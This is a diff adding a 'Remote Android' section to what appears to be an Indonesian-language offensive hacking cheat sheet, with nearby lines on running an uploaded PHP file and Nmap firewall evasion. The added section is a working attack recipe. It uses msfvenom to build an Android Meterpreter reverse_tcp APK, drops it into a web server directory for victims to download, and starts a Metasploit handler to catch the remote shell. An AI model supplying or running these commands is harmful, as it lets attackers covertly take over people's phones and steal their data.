@@ -193,6 +193,24 @@ exploit
 
 Masuk Browser jalankan file php yg berhasil di upload tadi di URL
 
+Remote Android
+```
+
+$ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.215 LPORT=4444 AndroidMeterpreterDebug=true AndroidWakelock=true R > /var/www/html/new.apk
+```
+```
+$ sudo service postgresql start
+```
+```
+$ msfconsole
+```
+```
+use exploit/multi/handler 
+set payload android/meterpreter/reverse_tcp 
+set lhost 192.168.x.x
+exploit
+```
+
 ### Nmap
 
 #### Firewall Evasion (Decoys,MTU & Fragmentation)
